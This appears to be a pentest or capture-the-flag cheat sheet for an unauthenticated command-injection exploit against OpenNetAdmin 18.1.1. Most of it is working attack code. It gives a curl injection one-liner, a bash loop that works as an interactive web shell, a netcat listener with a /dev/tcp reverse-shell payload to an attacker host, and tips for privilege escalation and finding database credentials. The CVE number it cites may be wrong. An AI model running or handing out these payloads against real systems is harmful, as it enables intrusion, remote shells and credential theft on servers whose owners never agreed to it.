# OpenNetAdmin 18.1.1 RCE

OpenNetAdmin 18.1.1 is vulnerable to unauthenticated remote code execution via a command injection in the `xajaxargs` parameter of the AJAX request handler.

## Exploit

```bash
# Single command execution
curl -s -d 'xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=formid=ip_alloc&xajaxargs[]=<xjxquery><q>default["objects"][0]["the_wall"]["0"];s=${IFS}&&echo${IFS}+RCE>cmd</q></xjxquery>&xajaxargs[]=dhcpstatus=0' http://<TARGET>/ona/
```

### Interactive Shell Script
```bash
#!/bin/bash
URL="http://<TARGET>/ona/"
while true; do
  echo -n "$ "
  read cmd
  curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=formid=ip_alloc&xajaxargs[]=<xjxquery><q>default[\"objects\"][0][\"the_wall\"][\"0\"];s=\${IFS}&&${cmd}</q></xjxquery>&xajaxargs[]=dhcpstatus=0" "$URL" | grep -oP '(?<=<output>).*?(?=</output>)'
done
```

## Get Reverse Shell

```bash
# Start listener
nc -lvnp 4444

# Inject reverse shell via the exploit
# cmd = "bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"
```

## Notes
- CVE-2019-12650 / EDB-ID 47772
- Default path: `/ona/` 
- Runs as www-data; check for SUID binaries or sudo rights for privesc
- Often has database credentials in `/opt/ona/www/local/config/database_settings.inc.php`
